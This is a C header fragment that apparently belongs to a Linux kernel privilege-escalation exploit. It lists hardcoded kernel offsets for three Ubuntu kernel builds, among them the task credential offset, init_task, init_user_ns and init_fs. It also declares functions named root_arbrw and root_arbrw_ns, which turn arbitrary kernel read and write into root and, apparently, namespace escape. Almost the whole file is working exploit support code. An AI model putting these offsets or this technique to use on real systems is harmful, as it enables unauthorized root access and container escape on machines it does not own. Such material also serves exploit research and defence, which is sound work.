/* -------------- ARBITRARY KERNEL READ/WRITE ------------------ */

extern off_t INIT_TASK;
extern off_t TASK_LINKS_OFFSET;
extern off_t TASK_PID_OFFSET;
extern off_t TASK_THREADPID_OFFSET;
extern off_t PID_NUMBERS_OFFSET;
extern off_t TASK_CRED_OFFSET;

extern off_t CRED_USERNS_OFFSET;
extern off_t INIT_USER_NS;
extern off_t TASK_FS_OFFSET;
extern off_t INIT_FS;

#ifdef KERNEL_4_4_0_31_generic
off_t INIT_TASK = 0xe11500;
off_t TASK_LINKS_OFFSET = 0x330;
off_t TASK_PID_OFFSET = 0x428;
off_t TASK_THREADPID_OFFSET = 0x0;
off_t PID_NUMBERS_OFFSET = 0x0;
off_t TASK_CRED_OFFSET = 0x5d0;

off_t CRED_USERNS_OFFSET = 0x88;
off_t INIT_USER_NS = 0xe42960;
off_t TASK_FS_OFFSET = 0x610;
off_t INIT_FS = 0xe82f40;
#endif

#ifdef KERNEL_5_0_0_38_generic
off_t INIT_TASK = 0x1617740;
off_t TASK_LINKS_OFFSET = 0x7a8;
off_t TASK_PID_OFFSET = 0x8a8;
off_t TASK_THREADPID_OFFSET = 0x910;
off_t PID_NUMBERS_OFFSET = 0x38;
off_t TASK_CRED_OFFSET = 0xa48;

off_t CRED_USERNS_OFFSET = 0x88;
off_t INIT_USER_NS = 0x16584c0;
off_t TASK_FS_OFFSET = 0xa90;
off_t INIT_FS = 0x170a480;
#endif

#ifdef KERNEL_5_8_0_48_generic
off_t INIT_TASK = 0x1614840;
off_t TASK_LINKS_OFFSET = 0x7e0;
off_t TASK_PID_OFFSET = 0x8e0;
off_t TASK_THREADPID_OFFSET = 0x948;
off_t PID_NUMBERS_OFFSET = 0x60;
off_t TASK_CRED_OFFSET = 0xa88;

off_t CRED_USERNS_OFFSET = 0x88;
off_t INIT_USER_NS = 0x165b460;
off_t TASK_FS_OFFSET = 0xad8;
off_t INIT_FS = 0x1717180;
#endif

int root_arbrw(uintptr_t kernbase, uint64_t(*arbread)(uintptr_t kptr), int (*arbwrite)(uintptr_t kptr, uint64_t value));
int root_arbrw_ns(uintptr_t kernbase, uint64_t(*arbread)(uintptr_t kptr), int (*arbwrite)(uintptr_t kptr, uint64_t value));
